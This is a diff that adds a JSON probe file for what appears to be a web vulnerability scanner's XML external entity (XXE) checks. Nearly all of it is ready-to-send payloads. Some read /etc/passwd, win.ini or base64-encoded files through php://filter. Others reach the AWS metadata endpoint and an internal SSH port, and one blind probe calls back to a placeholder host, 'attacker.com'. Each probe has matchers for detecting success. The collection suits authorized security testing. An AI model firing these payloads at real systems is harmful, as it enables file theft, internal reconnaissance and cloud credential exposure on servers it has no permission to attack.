@@ -1,0 +1,83 @@
+{
+  "category": "xxe",
+  "contexts": {
+    "file_read": {
+      "description": "XXE file read via external entity",
+      "tech_match": ["Java", "PHP", ".NET"],
+      "param_match": ["xml", "data", "payload", "soap", "content", "body"],
+      "probes": [
+        {
+          "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
+          "description": "Linux /etc/passwd read via external entity",
+          "matchers": [{"type": "word", "words": ["root:x:0", "root:"], "condition": "or"}],
+          "severity": "critical",
+          "confidence_boost": 50
+        },
+        {
+          "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///c:/windows/win.ini\">]><foo>&xxe;</foo>",
+          "description": "Windows win.ini read via external entity",
+          "matchers": [{"type": "word", "words": ["[extensions]", "[fonts]", "for 16-bit"], "condition": "or"}],
+          "severity": "critical",
+          "confidence_boost": 50
+        },
+        {
+          "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=/etc/passwd\">]><foo>&xxe;</foo>",
+          "description": "PHP filter base64 encode for binary-safe file read",
+          "matchers": [{"type": "regex", "pattern": "[A-Za-z0-9+/]{20,}={0,2}"}],
+          "severity": "critical",
+          "confidence_boost": 50
+        }
+      ]
+    },
+    "ssrf_via_xxe": {
+      "description": "SSRF via XXE external entity to internal services",
+      "tech_match": [],
+      "param_match": ["xml", "data", "payload", "soap"],
+      "probes": [
+        {
+          "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/\">]><foo>&xxe;</foo>",
+          "description": "AWS metadata via XXE SSRF",
+          "matchers": [{"type": "word", "words": ["ami-id", "instance-id", "hostname"], "condition": "or"}],
+          "severity": "critical",
+          "confidence_boost": 50
+        },
+        {
+          "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://127.0.0.1:22/\">]><foo>&xxe;</foo>",
+          "description": "Internal port scan via XXE (SSH banner)",
+          "matchers": [{"type": "word", "words": ["SSH", "OpenSSH", "refused"], "condition": "or"}],
+          "severity": "high",
+          "confidence_boost": 40
+        }
+      ]
+    },
+    "blind_oob": {
+      "description": "Blind XXE via out-of-band data exfiltration",
+      "tech_match": [],
+      "param_match": ["xml", "data", "payload", "soap"],
+      "probes": [
+        {
+          "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://{{callback}}/xxe_test\">%xxe;]><foo>test</foo>",
+          "description": "Blind XXE OOB — external DTD callback",
+          "matchers": [{"type": "status", "status": [200, 500]}],
+          "severity": "high",
+          "confidence_boost": 30,
+          "variables": {"callback": "attacker.com"}
+        }
+      ]
+    },
+    "error_based": {
+      "description": "Error-based XXE to extract data via error messages",
+      "tech_match": [],
+      "param_match": ["xml", "data", "payload"],
+      "probes": [
+        {
+          "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"file:///nonexistent\">%xxe;]><foo>test</foo>",
+          "description": "Error-based XXE — trigger file not found error with path disclosure",
+          "matchers": [{"type": "word", "words": ["No such file", "FileNotFoundException", "failed to load"], "condition": "or"}],
+          "severity": "medium",
+          "confidence_boost": 25
+        }
+      ]
+    }
+  }
+}
